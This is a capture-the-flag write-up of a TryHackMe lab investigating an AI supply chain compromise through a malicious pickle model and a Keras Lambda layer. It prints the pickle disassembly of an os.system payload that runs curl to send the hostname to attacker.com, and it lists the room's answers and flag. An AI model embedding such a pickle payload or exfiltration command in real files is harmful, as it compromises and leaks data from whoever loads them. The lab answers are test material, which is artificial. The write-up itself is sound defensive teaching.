## **AI Supply Chain Attack Investigation Overview**

AI supply chain attacks are one of the most dangerous modern cybersecurity threats because attackers no longer need to compromise systems directly. Instead, they target the **trusted components** developers already use such as **ML models**, **Python packages**, **prompt templates**, **dependencies**, and **external repositories**. These attacks are effective because the malicious payload is often disguised as a normal AI artefact, making detection difficult until after deployment.

In this TryHackMe investigation, the compromise started when a production ML model was replaced with a staged malicious model downloaded from a suspicious organization called **trustworthy-ai-lab**. The model appeared legitimate because it was hosted on a trusted platform and followed normal deployment procedures. However, the model contained hidden malicious instructions embedded inside a **pickle serialization payload**.

Unlike normal files, Python pickle models can execute arbitrary code during deserialization through dangerous methods such as **\_\_reduce\_\_**. This allows attackers to embed system-level commands directly inside the model file. Once the ML engineer loaded the model using pickle.load() or torch.load(), the payload executed automatically without requiring user interaction.

The investigation began by reviewing the **deployment timeline logs**. These logs revealed that:

* The original production model came from a verified organization  
* A new replacement model was later deployed from **trustworthy-ai-lab**  
* The deployment generated a warning because the source organization changed  
* Several weeks later, the SOC detected unusual outbound HTTPS traffic to an external server

This timeline was critical because it established the **attack window**. The compromise remained active for **21 days** before detection, proving how stealthy supply chain attacks can be in production environments.

The next phase involved safely inspecting the production model using **pickletools** instead of directly loading the file. This is important because loading an untrusted pickle executes embedded instructions immediately. The pickle disassembly revealed several highly suspicious indicators:

* Importing the **os** module  
* Calling the dangerous **system** function  
* Using pickle opcodes such as **STACK\_GLOBAL** and **REDUCE**  
* Executing a hidden curl command  
* Sending the server hostname to an attacker-controlled domain

The payload attempted to execute:

* curl "http://attacker.com/beacon"  
* Exfiltration of host identity using hostname

This demonstrated a classic **malicious serialization attack**, where the model acts as both data and executable malware.

Further investigation into the **beacon capture logs** showed outbound POST requests containing partial campaign identifiers. The attacker intentionally split the payload across multiple artefacts to avoid simple detection methods. This forced investigators to correlate evidence from:

* Deployment logs  
* Network traffic  
* Pickle analysis  
* Model architecture inspection

The final stage focused on the staged candidate model stored in .h5 format. Unlike pickle-based attacks that execute during loading, this model used a malicious **Keras Lambda layer** called **manipulate\_output**. Lambda layers are especially dangerous because they execute arbitrary Python code during inference time rather than load time.

Key findings from the architecture inspection included:

* Additional unexpected layer count  
* Suspicious Lambda layer  
* Hidden exfiltration suffix  
* Arbitrary inference-time execution capability

This highlighted an important lesson:  
 Even safer formats such as .h5, .keras, or **SafeTensors** do not fully eliminate AI supply chain risks because malicious behavior can also exist inside the model architecture itself.

The investigation also emphasized the importance of:

* **Telemetry monitoring**  
* **Static analysis**  
* **Sandboxed model loading**  
* **Checksum verification**  
* **Behavioral monitoring**  
* **Dependency auditing**  
* **Model provenance verification**

Several security tools played important roles during analysis:

* **pickletools** → Safe pickle disassembly  
* **Fickling** → Static pickle code analysis  
* **ModelScan** → Multi-format ML malware scanning  
* **SHA-256 hashing** → Integrity verification  
* **h5py inspection tools** → Architecture-level analysis

The incident demonstrates why organizations must implement a complete **Model Acquisition Framework** before deploying AI systems. Every external model should pass through:

1. **Quarantine**  
2. **Source Verification**  
3. **Integrity Checks**  
4. **Security Scanning**  
5. **Approval Review**

The lab also reinforced broader AI security concepts:

* **Dependency Confusion**  
* **Typosquatting**  
* **Prompt Template Injection**  
* **Silent Model Updates**  
* **API Supply Chain Risks**  
* **Architecture-Level Backdoors**  
* **LLM Trust Failures**  
* **Model Provenance Attacks**

One of the most important lessons from this investigation is that AI security is not limited to malware scanning. Trust in AI systems depends on the entire ecosystem:

* Model repositories  
* Training pipelines  
* Serialization formats  
* Prompt templates  
* External APIs  
* Package dependencies  
* Conversion services  
* Fine-tuning adapters

A model can appear functional, achieve high accuracy, and still contain hidden malicious behavior. Because of this, organizations must never trust externally sourced AI artefacts without verification, scanning, monitoring, and controlled deployment procedures.

---

Answer: trustworthy-ai-lab

Answer: 21

Answer: system

Answer: hostname

Answer: POST

Answer: manipulate\_output

Answer: THM{b4ckd00r\_1n\_pl41n\_s1ght}

## Step 1 — Read the deployment timeline

The first file to inspect was:

cat /opt/supply-chain/incident/logs/deployment.log

Important entries:

\[2024-01-05 09:15:23\] INFO  Source: huggingface.co/verified-ml-team/code-review-bert

\[2024-01-05 09:15:26\] INFO  Model deployed to production inference server

\[2024-01-26 14:32:12\] INFO  Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2

\[2024-01-26 14:32:14\] WARN  New source organisation detected: trustworthy-ai-lab

\[2024-01-26 14:32:16\] INFO  Model deployed to production inference server

\[2024-02-16 03:14:00\] ALERT SOC automated alert: unusual outbound HTTPS traffic detected

\[2024-02-16 03:14:01\] ALERT Destination: attacker.com:443

## Findings

* The replacement model came from a different organisation: **trustworthy-ai-lab**  
* The replacement model was deployed on **2024–01–26**  
* The SOC alert fired on **2024–02–16**  
* Time between deployment and detection: **21 days**

This already tells us the compromise was not immediate from the defender’s point of view. The malicious behaviour stayed unnoticed for three weeks.

## Step 2 — Decompile the production model safely

Never use pickle.load() on an untrusted pickle file.

To inspect the production model safely, I used pickletools:

python3 \-m pickletools /opt/supply-chain/incident/models/production\_model.pkl | head \-80

Output:

0: \\x80 PROTO      4

2: \\x95 FRAME      79

11: \\x8c SHORT\_BINUNICODE 'os'

16: \\x8c SHORT\_BINUNICODE 'system'

25: \\x93 STACK\_GLOBAL

27: \\x8c SHORT\_BINUNICODE 'curl "http://attacker.com/beacon" \-d "host=$(hostname)"'

87: R    REDUCE

89: .    STOP

## Findings

The malicious payload used:

* Python function: **system**  
* Shell command for host identity: **hostname**

The embedded command was:

curl "http://attacker.com/beacon" \-d "host=$(hostname)"

This is a classic pickle-based malicious serialisation attack. The model is not just “data” — it contains executable reconstruction instructions that trigger when loaded.

## Step 3 — Check the beacon evidence

Next file:

cat /opt/supply-chain/incident/logs/beacon\_capture.log

Relevant output:

\[2024-02-16 03:13:47\] PAYLOAD host=ml-server-prod\-01\&id=THM{b4ckd00r\_1n\_

\[2024-02-16 03:13:48\] SESSION beacon\-4821 BLOCKED  bytes\_captured=51  reason=SOC\_RULE\_4821

## Findings

* HTTP method used: **POST**  
* Partial campaign ID / flag captured:

THM{b4ckd00r\_1n\_

At this point, the flag was incomplete, which hinted that another artefact contained the remaining part.

## Step 4 — Inspect the staged candidate model

The engineering team had also staged a new model that had not yet been deployed:

python3 /opt/supply-chain/tools/inspect\_h5\_model.py /opt/supply-chain/incident/models/candidate\_model.h5

Output:

\=== Architecture Inspection: candidate\_model.h5 \===

 Total layers: 5

 \[OK\]      InputLayer           input\_layer\_2

 \[OK\]      Flatten              flatten\_2

 \[OK\]      Dense                dense\_4

 \[OK\]      Dense                dense\_5

 \[WARNING\] Lambda               manipulate\_output (function: manipulate\_output)

           exfil\_suffix: pl41n\_s1ght}

 RESULT: 1 layer(s) require review

   \- Lambda (manipulate\_output): Can contain arbitrary Python code that executes at inference time

## Findings

* Suspicious layer name: **manipulate\_output**  
* Hidden suffix:

pl41n\_s1ght}

This is a good reminder that even if you move away from pickle-based payloads, architecture-level attacks still matter. A suspicious Lambda layer can survive format changes and remain dangerous.

## Step 5 — Recover the full flag

The attacker split the campaign ID across two artefacts:

## Useful Commands From This Lab

cat /opt/supply-chain/incident/logs/deployment.log

cat /opt/supply-chain/incident/logs/beacon\_capture.log

python3 \-m pickletools /opt/supply-chain/incident/models/production\_model.pkl | head \-80

python3 /opt/supply-chain/tools/inspect\_h5\_model.py /opt/supply-chain/incident/models/

